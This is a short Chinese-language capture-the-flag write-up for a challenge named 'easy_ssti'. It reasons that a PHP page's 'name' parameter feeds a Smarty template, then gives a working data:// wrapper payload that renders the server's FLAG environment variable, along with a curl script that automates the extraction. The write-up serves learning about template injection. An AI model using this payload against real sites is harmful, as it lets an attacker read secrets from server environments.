#Web #PHP #smarty #SSTI 

```
/
```

![[Pasted image 20230514182339.png|500]]

随便点进去一个

```
/challenges.php?name=bridge
```

留意到图片的地址

```
/bridge/bridge.jpg
```

回头看一眼

题目描述
===

> R U **SMART** ENOUGH www

题目名
===

> easy_ssti

基本可以推测出是smarty的ssti

猜测后端实现是`name`参数与`/<template_name>`拼接作为模板路径

如果只是这样还不足以构成ssti，整个提交页面有一个统一的样式表和提交面板，于是我们开一下脑洞

1. 接收`name`参数，拼接成各子目录下的模板路径，使用`file_get_contents`直接读取模板内容
2. 将模板内容直接`sprintf`到一个全局的模板中（血压升高～）
3. 渲染这个模板（大事不妙啦）

于是构造模板字符串读取环境变量，用伪协议包装下就ok啦

```
/challenges.php?name=data://text/plain,{$smarty.env.FLAG}
```

![[Pasted image 20230514184325.png|800]]

---

一键获得flag（好像更麻烦？）

```shell
#/bin/bash

url='http://<host>:<port>/challenges.php'
payload='name=data://text/plain,{$smarty.env.FLAG}'

curl --silent $url -G --data-urlencode $payload | grep Spirit | sed -n 's/.*\(Spirit{.*}\).*/\1/p'
```